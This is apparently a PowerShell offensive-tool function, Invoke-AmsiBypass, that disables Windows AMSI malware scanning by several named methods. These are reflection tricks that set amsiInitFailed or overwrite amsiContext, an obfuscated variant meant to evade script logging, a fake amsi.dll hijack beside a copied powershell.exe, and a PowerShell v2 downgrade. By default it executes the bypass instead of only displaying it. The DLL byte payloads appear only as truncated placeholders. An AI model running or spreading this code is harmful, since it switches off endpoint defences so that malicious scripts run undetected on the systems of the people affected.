function Invoke-AmsiBypass
{
    [CmdletBinding()] Param(
        [Parameter(Position = 0, Mandatory = $False)]
        [ValidateSet("unload","unloadsilent","unloadobfuscated","unload2","dllhijack","psv2","obfuscation")]
        [String]
        $Method = "unloadsilent",
        [Parameter(Position = 1, Mandatory = $False)]
        [Switch]
        $ShowOnly
    )
    $AmsiX86 = "77 90 144 0 3 0 0 0 4...0 0 0 0 0 0 0 0 0 0 0 0 0" # NOTE: The actual 24551-character Base64 string omitted for readability.
    $AmsiX64 = "77 90 144 0 3 0 0 ... 0 0 0 0 0 0 0" # NOTE: The actual 29448-character Base64 string omitted for readability.
    if (([IntPtr]::Size) -eq 8)
    {
        Write-Verbose "64 bit process detected."
        $DllBytes = $AmsiX64
    }
    elseif (([IntPtr]::Size) -eq 4)
    {
        Write-Verbose "32 bit process detected."
        $DllBytes = $AmsiX86
    }
    switch($method)
    {
        "unload"
        {
            Write-Verbose "Using Matt Graeber's Reflection method."
            if ($ShowOnly -eq $True)
            {
                Write-Output "Use the following scriptblock before you run a script which gets detected."
                Write-Output '[Ref].Assembly.GetType(''System.Management.Automation.AmsiUtils'').GetField(''amsiInitFailed'',''NonPublic,Static'').SetValue($null,$true)'
            }
            else
            {
                Write-Output "Executing the bypass."
                [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
            }
        }
        "unloadsilent"
        {
            Write-Verbose "Using Matt Graeber's Reflection method with WMF5 autologging bypass."
            if ($ShowOnly -eq $True)
            {
                Write-Output "Use the following scriptblock before you run a script which gets detected."
                Write-Output '[Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType(''System.Reflection.Bindin''+''gFlags'')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType(''System.T''+''ype'')), [Object]([Ref].Assembly.GetType(''System.Management.Automation.AmsiUtils'')),(''GetFie''+''ld'')).Invoke(''amsiInitFailed'',((''Non''+''Public,Static'') -as [String].Assembly.GetType(''System.Reflection.Bindin''+''gFlags''))).SetValue($null,$True)'
            }
            else
            {
                Write-Output "Executing the bypass."
                [Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.T'+'ype')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetFie'+'ld')).Invoke('amsiInitFailed',(('Non'+'Public,Static') -as [String].Assembly.GetType('System.Reflection.Bindin'+'gFlags'))).SetValue($null,$True)
            }
        }
        "unloadobfuscated"
        {
            Write-Verbose "Using Matt Graeber's Reflection method with obfuscation from Daneil Bohannon's Invoke-Obfuscation - which bypasses WMF5 autologging."
            if ($ShowOnly -eq $True)
            {
                $code = @" 
Sv  ('R9'+'HYt') ( " ) )93]rahC[]gnirtS[,'UCS'(ecalpeR.)63]rahC[]gnirtS[,'aEm'(ecalpeR.)')eurt'+'aEm,llun'+'aEm(eulaVt'+'eS'+'.)UCScit'+'atS,ci'+'lbuPnoNUCS'+',U'+'CSdeli'+'aFt'+'inI'+'is'+'maUCS('+'dle'+'iF'+'teG'+'.'+')'+'UCSslitU'+'is'+'mA.noitamotu'+'A.tn'+'em'+'eganaM.'+'m'+'e'+'t'+'sySUCS(epy'+'TteG.ylbmessA'+'.]'+'feR['( (noisserpxE-ekovnI"  );  Invoke-Expression( -Join ( VaRIAbLe  ('R9'+'hyT')  -val  )[ - 1..- (( VaRIAbLe  ('R9'+'hyT')  -val  ).Length)])
"@
                Write-Output "Use the following scriptblock before you run a script which gets detected."
                Write-Output $code
            }
            else
            {
                Write-Output "Executing the bypass."
                Sv  ('R9'+'HYt') ( " ) )93]rahC[]gnirtS[,'UCS'(ecalpeR.)63]rahC[]gnirtS[,'aEm'(ecalpeR.)')eurt'+'aEm,llun'+'aEm(eulaVt'+'eS'+'.)UCScit'+'atS,ci'+'lbuPnoNUCS'+',U'+'CSdeli'+'aFt'+'inI'+'is'+'maUCS('+'dle'+'iF'+'teG'+'.'+')'+'UCSslitU'+'is'+'mA.noitamotu'+'A.tn'+'em'+'eganaM.'+'m'+'e'+'t'+'sySUCS(epy'+'TteG.ylbmessA'+'.]'+'feR['( (noisserpxE-ekovnI"  );  Invoke-Expression( -Join ( VaRIAbLe  ('R9'+'hyT')  -val  )[ - 1..- (( VaRIAbLe  ('R9'+'hyT')  -val  ).Length)])
            }
        }
        "unload2"
        {
            Write-Verbose "Using Matt Graeber's second Reflection method."
            if ($ShowOnly -eq $True)
            {
                Write-Output "Use the following scriptblock before you run a script which gets detected."
                Write-Output '[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType(''System.Management.Automation.AmsiUtils'').GetField(''amsiContext'',[Reflection.BindingFlags]''NonPublic,Static'').GetValue($null),0x41414141)'
            }
            else
            {
                Write-Output "Executing the bypass."
                [Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x41414141)
            }
        }
        "dllhijack"
        {
            Write-Verbose "Using Cornelis de Plaa's DLL hijack method."
            if ($ShowOnly -eq $True)
            {
                Write-Output "Copy powershell.exe from C:\Windows\System32\WindowsPowershell\v1.0 to a local folder and dropa fake amsi.dll in the same directory."
                Write-Output "Run the new powershell.exe and AMSI should be gone for that session."
            }
            else
            {
                [Byte[]] $temp = $DllBytes -split ' '                
                Write-Output "Executing the bypass."
                Write-Verbose "Dropping the fake amsi.dll to disk."
                [System.IO.File]::WriteAllBytes("$pwd\amsi.dll", $temp)
                Write-Verbose "Copying powershell.exe to the current working directory."
                Copy-Item -Path C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Destination $pwd
                Write-Verbose "Starting powershell.exe from the current working directory."
                & "$pwd\powershell.exe"
            }
        }
        "psv2"
        {
            Write-Verbose "Using PowerShell version 2 which doesn't support AMSI."
            if ($ShowOnly -eq $True)
            {
                Write-Output "If .Net version 2.0.50727 is installed, run powershell -v 2 and run scripts from the new PowerShell process."
            }
            else
            {
                Write-Verbose "Checking if .Net version 2.0.50727 is installed."
                $versions = Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -recurse | Get-ItemProperty -name Version -EA 0 | Where { $_.PSChildName -match '^(?!S)\p{L}'} | Select -ExpandProperty Version
                if($versions -match "2.0.50727")
                {
                    Write-Verbose ".Net version 2.0.50727 found."
                    Write-Output "Executing the bypass."
                    powershell.exe -version 2
                }
                else
                {
                    Write-Verbose ".Net version 2.0.50727 not found. Can't start PowerShell v2."
                }
            }
        }
        "obfuscation"
        {
            Write-Output "AMSI and the AVs which support it can be bypassed using obfuscation techqniues."
            Write-Output "ISE-Steroids (http://www.powertheshell.com/isesteroidsmanual/download/) and Invoke-Obfuscation can be used (https://github.com/danielbohannon/Invoke-Obfuscation)."
        }
    }
}
